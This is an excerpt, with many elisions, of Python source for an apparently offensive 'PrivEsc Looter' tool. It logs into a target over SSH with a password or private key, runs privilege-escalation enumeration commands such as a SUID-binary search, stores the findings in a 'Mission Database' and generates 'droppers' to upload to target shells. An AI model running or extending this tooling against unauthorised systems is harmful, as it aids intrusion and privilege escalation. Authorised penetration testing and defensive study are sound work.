...
LINUX_CHECKS = {
    ...
    "SUID Binaries (Root access)": r"find / -perm -u=s -type f 2>/dev/null | grep -v 'snap\|docker' | head -n 15",
...
class LooterEngine:
            ...
            with console.status(f"[bold cyan]Establishing secure connection to {target}...[/bold cyan]"):
                if key_path:
                    ...
                    self.ssh_client.connect(
                        hostname=target, port=port, username=username, pkey=key, timeout=10)
                else:
                    self.ssh_client.connect(
                        hostname=target, port=port, username=username, password=password, timeout=10)
            return True
        except paramiko.AuthenticationException:
            console.print(
                "[bold red][!] Authentication failed. Check credentials.[/bold red]")
    ...
    def generate_dropper(self):
        console.print(
            "[*] Generating standalone PrivEsc enumeration scripts...")
        ...
        console.print(
            f"[bold green][+] Droppers generated in /opt/davoid/payloads/[/bold green]")
        console.print(
            "[dim]Upload these to your target shell and execute them locally.[/dim]")
        questionary.press_any_key_to_continue(style=Q_STYLE).ask()

    def run_live_loot(self):
        target = questionary.text("Target IP:", style=Q_STYLE).ask()
        port = int(questionary.text(
            "SSH Port:", default="22", style=Q_STYLE).ask())
        username = questionary.text("Username:", style=Q_STYLE).ask()

        auth_method = questionary.select("Authentication Method:", choices=[
                                         "Password", "Private Key"], style=Q_STYLE).ask()
        password = None
        key_path = None
        ...
        if auth_method == "Password":
            ...
            key_path = questionary.text(
                "Absolute Path to Private Key (e.g. /root/.ssh/id_rsa):", style=Q_STYLE).ask()
        ...
        console.print(
            f"[*] Target identified as: [bold magenta]{os_name}[/bold magenta]")
        console.print(
            "[*] Commencing automated Privilege Escalation enumeration...\n")

        table = Table(
            title=f"PrivEsc Looter Report: {target}", border_style="bold red", expand=True)
        ...
        with console.status("[bold cyan]Looting target...", spinner="bouncingBar"):
            for name, cmd in checks.items():
                # Slight delay to avoid crashing unstable shells
                time.sleep(0.5)
        ...
        # Log to Database
        db.log("PrivEsc-Looter", target,
               f"User: {username}\n" + "\n".join(findings_log), "HIGH")
        console.print(
            "[bold green][+] Looter complete. High-value data saved to Mission Database.[/bold green]")
        questionary.press_any_key_to_continue(style=Q_STYLE).ask()
